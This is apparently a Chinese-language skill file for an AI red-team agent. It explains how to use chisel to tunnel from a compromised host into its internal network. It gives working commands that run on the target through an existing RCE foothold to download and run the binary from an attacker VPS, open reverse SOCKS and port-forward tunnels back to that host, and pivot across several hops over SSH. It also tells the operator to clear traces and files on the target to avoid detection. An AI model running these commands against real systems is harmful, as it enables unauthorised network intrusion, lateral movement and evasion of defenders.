---
name: chisel-tunnel
description: chisel 隧道：HTTP/WebSocket 封装的多路复用隧道，最易穿透出网限制与反向代理
whenToUse: suo5 不适用（非 WebShell 入口）、目标只能出 HTTP、需要端口转发或稳定 SOCKS 时
role: internal
enabled: true
---

# chisel（HTTP 隧道 / 端口转发）

> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，
> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。

`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。
它和 suo5 的分工：

| | suo5 | chisel |
| --- | --- | --- |
| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |
| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |
| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |
| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |

**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。

## 本机二进制

| 文件 | 路径 |
| --- | --- |
| chisel（Linux amd64，服务端与客户端同一个二进制） | `$DSH_HOME/redteam/toolkit/chisel/chisel`（v1.12.0） |

已同步到 VPS 载荷目录：`http://$REDTEAM_VPS_HOST:9100/`（目标可 `curl` 直接拉）。

## 一、反向 SOCKS（最常用：目标主动连我们）

```bash
# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  允许客户端注册反向隧道
#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）
#    可选加固：--auth user:pass   加认证，避免被扫到白用
#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点

# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口

# 3) 本机通过 VPS 的 SOCKS 访问内网
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置
```

## 二、反向端口转发（把内网某个端口映射出来）

```bash
# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# 本机：直接连 VPS:13389 即为内网 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）

```bash
# 目标侧起服务端
/tmp/c server -p 9443 --socks5
# 我方起客户端做本地转发
chisel client <target>:9443 1080:socks
# 之后 proxychains 指向 127.0.0.1:1080
```

## 四、多级 / 联动

```bash
# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# 逐层扩大可达范围，每层都要登记隧道与可达网段
```

## 五、纪律与自保

1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。
2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。
3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；
   **VPS 安全组要放行**。
4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。
5. **不要用自建 VPS 上的代理冒充"突破"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。

## 六、输出与落库（强制）

1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：
   - `kind`：`chisel`；
   - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；
   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；
   - `reach`：**可达网段**（如 `10.0.0.0/24`，实测出来再填，别猜）；
   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或
     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；
     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标"不算突破"**；
   - `command`：完整命令原文（服务端 + 客户端两段都要）。
2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，
   通了才算隧道成立；然后 `redteam_session_check` 回写状态。
3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；
   通过它横向到其它主机 → `server-host`。
4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），
   写清监听地址与端口，并说明该隧道跨越了靶标边界。
5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。
